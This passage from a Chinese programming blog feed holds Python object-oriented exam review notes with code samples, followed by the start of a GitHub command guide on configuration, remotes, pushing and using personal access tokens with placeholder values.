class="comment">#定义CaptureImage方法</span></span><br><span class="line"><span class="number">6</span>                 <span class="built_in">print</span>(<span class="string">&#x27;Camera类中的CaptureImage方法被调用！  &#x27;</span>)</span><br><span class="line"><span class="number">7</span>          <span class="keyword">def</span> <span class="title function_">CaptureImageTest</span>(<span class="params">arg</span>): <span class="comment">#定义CaptureImageTest方法</span></span><br><span class="line"><span class="number">8</span>              arg.CaptureImage() <span class="comment">#通过arg调用CaptureImage方法</span></span><br><span class="line"><span class="number">9</span>          <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">10</span>           p=Person() <span class="comment">#定义Person类对象p</span></span><br><span class="line"><span class="number">11</span>            c=Camera() <span class="comment">#定义Camera类对象c</span></span><br><span class="line"><span class="number">12</span>            CaptureImageTest(p)</span><br><span class="line"><span class="number">13</span>            CaptureImageTest(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Person类中的CaptureImage方法被调用！</span></span><br><span class="line"><span class="comment">#Camera类中的CaptureImage方法被调用！</span></span><br></pre></td></tr></table></figure>

<p>实际上，Python中的多态也是借助鸭子类型实现，与C++、Java等语言中的多态并不是同一含义。<br>“如果走起来像鸭子，叫起来像鸭子，它就是鸭子！”</p>
<h2 id="super方法"><a href="#super方法" class="headerlink" title="super方法"></a>super方法</h2><p>super方法用于获取父类的代理对象，以执行已在子类中被重写的父类方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>          <span class="keyword">class</span> <span class="title class_">Person</span>: <span class="comment">#定义Person类</span></span><br><span class="line"><span class="number">2</span>              <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>                 <span class="built_in">print</span>(<span class="string">&#x27;Person类构造方法被调用！  &#x27;</span>)</span><br><span class="line"><span class="number">4</span>                  <span class="variable language_">self</span>.name=name <span class="comment">#将self对象的name属性赋为形参name的值</span></span><br><span class="line"><span class="number">5</span>          <span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>): <span class="comment">#以Person类作为父类定义子类Student</span></span><br><span class="line"><span class="number">6</span>              <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sno, name</span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">7</span>                 <span class="built_in">print</span>(<span class="string">&#x27;Student类构造方法被调用！  &#x27;</span>)</span><br><span class="line"><span class="number">8</span>                 <span class="built_in">super</span>().__init__(name) <span class="comment">#调用父类的构造方法</span></span><br><span class="line"><span class="number">9</span>                  <span class="variable language_">self</span>.sno=sno <span class="comment">#将self对象的sno属性赋为形参sno的值</span></span><br><span class="line"><span class="number">10</span>        <span class="keyword">class</span> <span class="title class_">Postgraduate</span>(<span class="title class_ inherited__">Student</span>): <span class="comment">#以Student类作为父类定义子类Postgraduate</span></span><br><span class="line"><span class="number">11</span>            <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sno, name, tutor</span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">12</span>               <span class="built_in">print</span>(<span class="string">&#x27;Postgraduate类构造方法被调用！  &#x27;</span>)</span><br><span class="line"><span class="number">13</span>               <span class="built_in">super</span>().__init__(sno, name) <span class="comment">#调用父类的构造方法</span></span><br><span class="line"><span class="number">14</span>                <span class="variable language_">self</span>.tutor=tutor <span class="comment">#将self对象的tutor属性赋为形参tutor的值</span></span><br><span class="line"><span class="number">15</span>        <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">16</span>           pg=Postgraduate(<span class="string">&#x27;1810100&#x27;</span>,<span class="string">&#x27;李晓明&#x27;</span>,<span class="string">&#x27;马红&#x27;</span>) <span class="comment">#创建Postgraduate类对象pg</span></span><br><span class="line"><span class="number">17</span>           <span class="built_in">print</span>(<span class="string">&#x27;学号：  %s，姓名：  %s，导师：  %s&#x27;</span>%(pg.sno,pg.name,pg.tutor))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Postgraduate类构造方法被调用！</span></span><br><span class="line"><span class="comment">#Student类构造方法被调用！</span></span><br><span class="line"><span class="comment">#Person类构造方法被调用！</span></span><br><span class="line"><span class="comment">#学号：  1810100，姓名：李晓明，导师：马红</span></span><br></pre></td></tr></table></figure>

<h2 id="内置函数isinstance、-issubclass和type"><a href="#内置函数isinstance、-issubclass和type" class="headerlink" title="内置函数isinstance、 issubclass和type"></a>内置函数isinstance、 issubclass和type</h2><p>isinstance    用于判断一个对象所属的类是否是指定类或指定类的子类</p>
<p>issubclass   用于判断一个类是否是另一个类的子类</p>
<p>type           用于获取一个对象所属的类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>: <span class="comment">#定义Person类</span></span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>): <span class="comment">#以Person类作为父类定义子类Student</span></span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flower</span>: <span class="comment">#定义Flower类</span></span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">     stu=Student() <span class="comment">#创建Student类对象stu</span></span><br><span class="line">     f=Flower() <span class="comment">#创建Flower对象</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;stu是Person类或其子类对象：  &#x27;</span>, <span class="built_in">isinstance</span>(stu,Person))      </span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;stu是Student类或其子类对象：  &#x27;</span>, <span class="built_in">isinstance</span>(stu,Student))</span><br><span class="line">     <span class="comment">#stu是Person类或其子类对象：   True</span></span><br><span class="line">     <span class="comment">#stu是Student类或其子类对象：   True</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;f是Person类或其子类对象：  &#x27;</span>, <span class="built_in">isinstance</span>(f,Person))</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;Student是Person类的子类：  &#x27;</span>, <span class="built_in">issubclass</span>(Student,Person))       </span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;Flower是Person类的子类：  &#x27;</span>, <span class="built_in">issubclass</span>(Flower,Person))</span><br><span class="line">     <span class="comment">#f是Person类或其子类对象：   False</span></span><br><span class="line">     <span class="comment">#Student是Person类的子类：   True</span></span><br><span class="line">     <span class="comment">#Flower是Person类的子类：   False</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;stu对象所属的类：  &#x27;</span>, <span class="built_in">type</span>(stu))</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;f对象所属的类：  &#x27;</span>, <span class="built_in">type</span>(f))</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;stu是Person类对象：  &#x27;</span>, <span class="built_in">type</span>(stu)==Person)</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;stu是Student类对象：  &#x27;</span>, <span class="built_in">type</span>(stu)==Student)</span><br><span class="line">     <span class="comment">#stu对象所属的类：   &lt;class &#x27;__main__.Student&#x27;&gt;</span></span><br><span class="line">     <span class="comment">#f对象所属的类：   &lt;class &#x27;__main__.Flower&#x27;&gt;</span></span><br><span class="line">     <span class="comment">#stu是Person类对象：   False</span></span><br><span class="line">     <span class="comment">#stu是Student类对象：   True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果我们要判断一个对象的类型是否是指定类或该类的子类，则可以使用isinstance函数。<br>如果我们要判断一个对象的类型是否是指定类，则可以使用“type(对象名)&#x3D;&#x3D;类名”的方式。</p>
<h2 id="类方法和静态方法"><a href="#类方法和静态方法" class="headerlink" title="类方法和静态方法"></a>类方法和静态方法</h2><p>类方法是指使用@classmethod修饰的方法，其第一个参数是类本身，而不是类的实例对象。</p>
<p>类方法的特点是既可以通过类名直接调用，也可以通过类的实例对象调用。</p>
<p><strong>装饰器：</strong></p>
<p>装饰器可以实现在特定条件下为某些函数在不改动函数体的时候为函数新添加一些功能，本质上是一个语法糖</p>
<p>基于@语法和函数闭包，将原函数封装在闭包中，然后将函数赋值为一个新的函数</p>
<p>在不改变函数内部代码和调用的前提下，实现在函数执行拓展功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#类方法</span></span><br><span class="line"><span class="number">1</span>          <span class="keyword">class</span> <span class="title class_">Complex</span>: <span class="comment">#定义Complex类</span></span><br><span class="line"><span class="number">2</span>              <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,real=<span class="number">0</span>,image=<span class="number">0</span></span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>                  <span class="variable language_">self</span>.real=real <span class="comment">#初始化一个复数的实部值</span></span><br><span class="line"><span class="number">4</span>                  <span class="variable language_">self</span>.image=image <span class="comment">#初始化一个复数的虚部值                        </span></span><br><span class="line"><span class="number">5</span>              @<span class="built_in">classmethod</span> <span class="comment">#必须单写一行</span></span><br><span class="line"><span class="number">6</span>              <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">cls,c1,c2</span>): <span class="comment">#定义类方法add，实现两个复数的加法运算</span></span><br><span class="line"><span class="number">7</span>                 <span class="built_in">print</span>(cls) <span class="comment">#输出cls</span></span><br><span class="line"><span class="number">8</span>                  c=Complex() <span class="comment">#创建Complex类对象c</span></span><br><span class="line"><span class="number">9</span>                  c.real=c1.real+c2.real <span class="comment">#实部相加</span></span><br><span class="line"><span class="number">10</span>                c.image=c1.image+c2.image <span class="comment">#虚部相加</span></span><br><span class="line"><span class="number">11</span>                <span class="keyword">return</span> c</span><br><span class="line"><span class="number">12</span>        <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">13</span>            c1=Complex(<span class="number">1</span>,<span class="number">2.5</span>)</span><br><span class="line"><span class="number">14</span>            c2=Complex(<span class="number">2.2</span>,<span class="number">3.1</span>)</span><br><span class="line"><span class="number">15</span>            c=Complex.add(c1,c2) <span class="comment">#直接使用类名调用类方法add</span></span><br><span class="line"><span class="number">16</span>           <span class="built_in">print</span>(<span class="string">&#x27;c1+c2的结果为%.2f+%.2fi&#x27;</span>%(c.real,c.image))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.Complex&#x27;&gt;</span></span><br><span class="line"><span class="comment">#c1+c2的结果为3.20+5.60i</span></span><br></pre></td></tr></table></figure>

<p>将第15行的“c&#x3D;Complex.add(c1,c2) ”改为“c&#x3D;c1.add(c1, c2) ”或 “c&#x3D;c2.add(c1, c2)” ，程序运行后可得到相同的输出结果，即类方法也可以使用实例对象调用。</p>
<p>通过“print(cls) ”输出类方法add的第一个参数，从输出结果中可以看到cls是Complex类。</p>
<p>作用：用来使用类的属性或者是给类的属性赋值，可以在类方法中使用cls参数来实现</p>
<p><strong>静态方法：</strong></p>
<p>静态方法是指使用@staticmethod修饰的方法。</p>
<p>与类方法相同， 静态方法既可以直接通过类名调用， 也可以通过类的实例对象调用。</p>
<p>与类方法不同的地方在于，静态方法中没有类方法中的第一个类参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>          <span class="keyword">class</span> <span class="title class_">Complex</span>: <span class="comment">#定义Complex类</span></span><br><span class="line"><span class="number">2</span>              <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,real=<span class="number">0</span>,image=<span class="number">0</span></span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>                  <span class="variable language_">self</span>.real=real <span class="comment">#初始化一个复数的实部值</span></span><br><span class="line"><span class="number">4</span>                  <span class="variable language_">self</span>.image=image <span class="comment">#初始化一个复数的虚部值                      </span></span><br><span class="line"><span class="number">5</span>              @<span class="built_in">staticmethod</span></span><br><span class="line"><span class="number">6</span>              <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">c1,c2</span>): <span class="comment">#定义类方法add，实现两个复数的加法运算</span></span><br><span class="line"><span class="number">7</span>                  c=Complex() <span class="comment">#创建Complex类对象c</span></span><br><span class="line"><span class="number">8</span>                  c.real=c1.real+c2.real <span class="comment">#实部相加</span></span><br><span class="line"><span class="number">9</span>                  c.image=c1.image+c2.image <span class="comment">#虚部相加</span></span><br><span class="line"><span class="number">10</span>                <span class="keyword">return</span> c</span><br><span class="line"><span class="number">11</span>        <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">12</span>            c1=Complex(<span class="number">1</span>,<span class="number">2.5</span>)</span><br><span class="line"><span class="number">13</span>            c2=Complex(<span class="number">2.2</span>,<span class="number">3.</span> <span class="number">1</span>)</span><br><span class="line"><span class="number">14</span>            c=Complex.add(c1,c2) <span class="comment">#直接使用类名调用类方法add</span></span><br><span class="line"><span class="number">15</span>            <span class="built_in">print</span>(<span class="string">&#x27;c1+c2的结果为%.2f+%.2fi&#x27;</span>%(c.real,c.image))</span><br><span class="line"></span><br><span class="line"><span class="comment">#c1+c2的结果为3.20+5.60i</span></span><br></pre></td></tr></table></figure>

<p>作用：静态方法逻辑上属于类，但是和类本身没有关系，也就是说在静态方法中，不会涉及到类中的属性和方法的操作。可以理解为，静态方法是个独立的、单纯的函数，它仅仅托管于某个类的名称空间中，便于使用和维护。</p>
<h2 id="动态扩展类与实例"><a href="#动态扩展类与实例" class="headerlink" title="动态扩展类与实例"></a>动态扩展类与实例</h2><p><strong>动态扩展类与实例：</strong></p>
<p>Python作为一种动态语言，除了可以在定义类时定义属性和方法外，还可以动态地为已经创建的对象绑定新的属性和方法。</p>
<p>给类绑定方法，直接进行赋值即可</p>
<p>在给对象绑定方法时，需要使用types模块中的MethodType函数，其第一个参数是要绑定的函数名，第二个参数是绑定的对象名。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>          <span class="keyword">from</span> types <span class="keyword">import</span> MethodType <span class="comment">#从types模块中导入MethodType函数</span></span><br><span class="line"><span class="number">2</span>          <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义学生类</span></span><br><span class="line"><span class="number">3</span>             <span class="keyword">pass</span></span><br><span class="line"><span class="number">4</span>          <span class="keyword">def</span> <span class="title function_">SetName</span>(<span class="params">self,name</span>): <span class="comment">#定义SetName函数</span></span><br><span class="line"><span class="number">5</span>              <span class="variable language_">self</span>.name=name</span><br><span class="line"><span class="number">6</span>          <span class="keyword">def</span> <span class="title function_">SetSno</span>(<span class="params">self,sno</span>): <span class="comment">#定义SetSno函数</span></span><br><span class="line"><span class="number">7</span>              <span class="variable language_">self</span>.sno=sno</span><br><span class="line"><span class="number">8</span>          <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">9</span>              stu1=Student() <span class="comment">#定义Student类对象stu1</span></span><br><span class="line"><span class="number">10</span>            stu2=Student() <span class="comment">#定义Student类对象stu2</span></span><br><span class="line"><span class="number">11</span>            stu1.SetName=MethodType(SetName,stu1)<span class="comment">#为stu1对象绑定SetName方法</span></span><br><span class="line"><span class="number">12</span>           Student.SetSno=SetSno <span class="comment">#为Student类绑定SetSno方法</span></span><br><span class="line"><span class="number">13</span>            stu1.SetName(<span class="string">&#x27;李晓明&#x27;</span>)</span><br><span class="line"><span class="number">14</span>            stu1.SetSno(<span class="string">&#x27;1810100&#x27;</span>)</span><br><span class="line"><span class="number">15</span>            <span class="comment">#stu2.SetName(&#x27;张刚&#x27;) #取消注释则会报错</span></span><br><span class="line"><span class="number">16</span>            stu2.SetSno(<span class="string">&#x27;1810101&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>提示：给一个对象绑定方法后，只能通过该对象调用该方法，其他未绑     定该方法的对象则不能调用。例如，没有为stu2对象绑定SetName方法，因此，如果将第15行前面的注释符取消，则程序运行时系统会报错。<br>而第12行为Student类绑定了SetSno方法，则Student类中的所有实例对象都有该方法。</p>
<h2 id="property装饰器"><a href="#property装饰器" class="headerlink" title="@property装饰器"></a>@property装饰器</h2><p>类中的属性可以直接访问和赋值，这为类的使用者提供了方便，但也带来了问题：类的使用者可能会给一个属性赋上超出有效范围的值。</p>
<p>为了解决这个问题，  Python提供了@property装饰器，可以将类中属性的访问和赋值操作自动转为方法调用，这样可以在方法中对属性值的取值范围做一些条件限定。</p>
<p>直接使用@property就可以定义一个用于获取属性值的方法(即getter)。</p>
<p>如果要定义一个设置属性值的方法(setter)，则需要使用名字”@属性名.setter”的装饰器。</p>
<p>如果一个属性只有用于获取属性值的getter方法，而没有用于设置属性值的setter方法，则该属性是一个只读属性，只允许读取该属性的值、而不能设置该属性的值。</p>
<p>例：通过@property装饰器使得学生成绩的取值范围必须在0~100之间。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>          <span class="keyword">import</span> datetime</span><br><span class="line"><span class="number">2</span>          <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line"><span class="number">3</span>             @<span class="built_in">property</span></span><br><span class="line"><span class="number">4</span>             <span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">self</span>): <span class="comment">#用@property装饰器定义一个用于获取score值的方法</span></span><br><span class="line"><span class="number">5</span>                  <span class="keyword">return</span> <span class="variable language_">self</span>._score</span><br><span class="line"><span class="comment"># 注意：在类的setter和getter方法中使用self访问属性时，需要在属性名前加上下划线，否则系统会因不断递归调用而报错。</span></span><br><span class="line"><span class="number">6</span>         @score.setter</span><br><span class="line"><span class="number">7</span>         <span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">self, score</span>): <span class="comment">#用score.setter定义一个用于设置score值的方法</span></span><br><span class="line"><span class="number">8</span>              <span class="keyword">if</span> score&lt;<span class="number">0</span> <span class="keyword">or</span> score&gt;<span class="number">100</span>: <span class="comment">#不符合0~100的限定条件</span></span><br><span class="line"><span class="number">9</span>                 <span class="built_in">print</span>(<span class="string">&#x27;成绩必须在0~100之间！  &#x27;</span>)</span><br><span class="line"><span class="number">10</span>            <span class="keyword">else</span>:</span><br><span class="line"><span class="number">11</span>                <span class="variable language_">self</span>._score=score       </span><br><span class="line"><span class="number">12</span>        @<span class="built_in">property</span></span><br><span class="line"><span class="number">13</span>       <span class="keyword">def</span> <span class="title function_">age</span>(<span class="params">self</span>): <span class="comment">#用@property装饰器定义一个用于获取age值的方法</span></span><br><span class="line"><span class="number">14</span>            <span class="keyword">return</span> datetime.datetime.now().year-<span class="variable language_">self</span>.birthyear</span><br><span class="line"><span class="number">15</span>        <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">16</span>            stu=Student() <span class="comment">#创建Student类对象stu</span></span><br><span class="line"><span class="number">17</span>            stu.score=<span class="number">80</span> <span class="comment">#将stu对象的score属性赋值为80</span></span><br><span class="line"><span class="number">18</span>            stu.birthyear=<span class="number">2000</span> <span class="comment">#将stu对象的birthyear属性赋值为2000</span></span><br><span class="line"><span class="number">19</span>            <span class="built_in">print</span>(<span class="string">&#x27;年龄：  %d,成绩：  %d&#x27;</span>%(stu.age,stu.score))<span class="comment">#年龄：  23,成绩： 80</span></span><br><span class="line"><span class="number">20</span>            <span class="comment">#stu.age=19 #取消前面的注释符则会报错</span></span><br><span class="line"><span class="number">21</span>            stu.score=<span class="number">105</span> <span class="comment">#将stu对象的score属性赋值为105</span></span><br><span class="line"><span class="number">22</span>            <span class="built_in">print</span>(<span class="string">&#x27;年龄：  %d,成绩：  %d&#x27;</span>%(stu.age,stu.score))<span class="comment">#成绩必须在0~100之间！年龄：   23,成绩： 80</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>复习总结</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>期末复习</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub常用指令</title>
    <url>/2025/07/01/GitHub%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote>
<p>本文内容来源于 <strong>Make BUPT Great Again</strong> 整理</p>
</blockquote>
<h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><h3 id="设置用户信息"><a href="#设置用户信息" class="headerlink" title="设置用户信息"></a>设置用户信息</h3><p>在开始使用 Git 之前，需要配置你的用户信息。这些信息会出现在每次提交的记录中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的邮箱地址&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;xxx&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;xxx@example.com&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li><code>--global</code> 参数表示全局配置，对当前用户的所有仓库生效</li>
<li>如果只想为某个仓库单独配置，可以在仓库目录下去掉 <code>--global</code> 参数</li>
</ul>
<p><strong>查看当前配置：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --list</span><br></pre></td></tr></table></figure>

<h2 id="远程仓库操作"><a href="#远程仓库操作" class="headerlink" title="远程仓库操作"></a>远程仓库操作</h2><h3 id="添加远程仓库"><a href="#添加远程仓库" class="headerlink" title="添加远程仓库"></a>添加远程仓库</h3><p>将本地仓库与远程 GitHub 仓库关联。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add &lt;远程仓库简称&gt; &lt;远程仓库URL&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin https://github.com/xxx/repository-name.git</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li><code>origin</code> 是远程仓库的默认名称（可自定义）</li>
<li>一个本地仓库可以关联多个远程仓库</li>
</ul>
<p><strong>查看远程仓库：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<h3 id="推送到远程仓库"><a href="#推送到远程仓库" class="headerlink" title="推送到远程仓库"></a>推送到远程仓库</h3><p><strong>普通推送：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push -u &lt;远程仓库简称&gt; &lt;本地分支名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li><code>-u</code> (或 <code>--set-upstream</code>) 参数会建立本地分支与远程分支的追踪关系</li>
<li>首次推送时使用 <code>-u</code>，之后可以直接使用 <code>git push</code></li>
</ul>
<p><strong>强制推送（危险操作）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push -f origin main</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li><code>-f</code> (或 <code>--force</code>) 会强制覆盖远程仓库的历史</li>
<li>⚠️ <strong>谨慎使用</strong>：可能导致其他协作者的提交丢失</li>
<li>更安全的替代方案：<code>git push --force-with-lease</code>（仅在远程分支未被他人更新时才强制推送）</li>
</ul>
<h2 id="🔐-使用个人访问令牌实现私有库访问"><a href="#🔐-使用个人访问令牌实现私有库访问" class="headerlink" title="🔐 使用个人访问令牌实现私有库访问"></a>🔐 使用个人访问令牌实现私有库访问</h2><h3 id="什么是-PAT？"><a href="#什么是-PAT？" class="headerlink" title="什么是 PAT？"></a>什么是 PAT？</h3><p>Personal Access Token (个人访问令牌) 是 GitHub 提供的一种安全认证方式，用于替代传统的用户名密码认证。特别适用于：</p>
<ul>
<li>访问私有仓库</li>
<li>两步验证 (2FA) 启用的账户</li>
<li>自动化脚本和 CI&#x2F;CD 流程</li>
</ul>
<h3 id="📋-创建-PAT-的步骤"><a href="#📋-创建-PAT-的步骤" class="headerlink" title="📋 创建 PAT 的步骤"></a>📋 创建 PAT 的步骤</h3><ol>
<li>登录 GitHub → 点击右上角头像 → Settings</li>
<li>左侧菜单中选择 Developer settings</li>
<li>选择 Personal access tokens → Tokens (classic)</li>
<li>点击 Generate new token → Generate new token (classic)</li>
<li>填写信息：<ul>
<li><strong>Note</strong>: 给 token 起个名字（如：”My Local Development”）</li>
<li><strong>Expiration</strong>: 设置过期时间</li>
<li><strong>Select scopes</strong>: 勾选需要的权限 (很重要)<ul>
<li><code>repo</code> - 完整的仓库访问权限</li>
<li><code>workflow</code> - 访问 GitHub Actions</li>
<li><code>read:org</code> - 读取组织信息</li>
</ul>
</li>
</ul>
</li>
<li>点击 Generate token</li>
</ol>
<p>⚠️ <strong>重要</strong>: 立即复制并保存 token，页面刷新后将无法再次查看</p>
<h3 id="🔧-使用-PAT-的三种方式"><a href="#🔧-使用-PAT-的三种方式" class="headerlink" title="🔧 使用 PAT 的三种方式"></a>🔧 使用 PAT 的三种方式</h3><p><strong>方式一：在 URL 中直接使用 PAT</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加远程仓库时直接在URL中包含PAT</span></span><br><span class="line">git remote add origin https://&lt;username&gt;:&lt;PAT&gt;@github.com/&lt;username&gt;/&lt;repository&gt;.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">git remote add origin https://xxx:ghp_xxxxxxxxxxxxxxxxxxxx@github.com/xxx/repository-name.git</span><br></pre></td></tr></table></figure>

<p><strong>方式二：克隆时使用 PAT</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 克隆私有仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://&lt;username&gt;:&lt;PAT&gt;@github.com/&lt;username&gt;/&lt;repository&gt;.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">git <span class="built_in">clone</span> https://xxx:ghp_xxxxxxxxxxxxxxxxxxxx@github.com/xxx/private-repo.git</span><br></pre></td></tr></table></figure>

<p><strong>方式三：使用 Git Credential Helper（推荐）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置 Git 使用 credential helper</span></span><br><span class="line">git config --global credential.helper store</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次推送时会要求输入用户名和密码</span></span><br><span class="line">git push -u origin main</span><br><span class="line"><span class="comment"># Username: 你的GitHub用户名</span></span><br><span class="line"><span class="comment"># Password: 你的PAT (不是GitHub密码)</span></span><br></pre></td></tr></table></figure>

<h3 id="📝-完整的私有仓库操作流程"><a href="#📝-完整的私有仓库操作流程" class="headerlink" title="📝 完整的私有仓库操作流程"></a>📝 完整的私有仓库操作流程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 初始化本地仓库</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 添加文件</span></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 提交</span></span><br><span class="line">git commit -m <span class="string">&quot;Initial commit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 添加远程仓库（使用PAT）</span></span><br><span class="line">git remote add origin https://&lt;username&gt;:&lt;PAT&gt;@github.com/&lt;username&gt;/&lt;repository&gt;.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 推送到远程</span></span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>

<h3 id="🔒-安全最佳实践"><a href="#🔒-安全最佳实践" class="headerlink" title="🔒 安全最佳实践"></a>🔒 安全最佳实践</h3><p><strong>✅ 推荐做法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用环境变量存储PAT</span></span><br><span class="line"><span class="built_in">export</span> GITHUB_TOKEN=<span class="string">&quot;your_pat_here&quot;</span></span><br><span class="line">git remote add origin https://username:<span class="variable">$GITHUB_TOKEN</span>@github.com/username/repo.git</span><br></pre></td></tr></table></figure>

<p><strong>❌ 避免的做法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不要在脚本中明文写入PAT</span></span><br><span class="line">git remote add origin https://username:ghp_clearly_visible_token@github.com/user/repo.git</span><br></pre></td></tr></table></figure>

<h3 id="🛠️-常见问题解决"><a href="#🛠️-常见问题解决" class="headerlink" title="🛠️ 常见问题解决"></a>🛠️ 常见问题解决</h3><p><strong>更新已存在的远程仓库 URL</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前远程仓库</span></span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新远程仓库URL以包含PAT</span></span><br><span class="line">git remote set-url origin https://&lt;username&gt;:&lt;PAT&gt;@github.com/&lt;username&gt;/&lt;repository&gt;.git</span><br></pre></td></tr></table></figure>

<p><strong>临时使用 PAT 推送</strong></p>
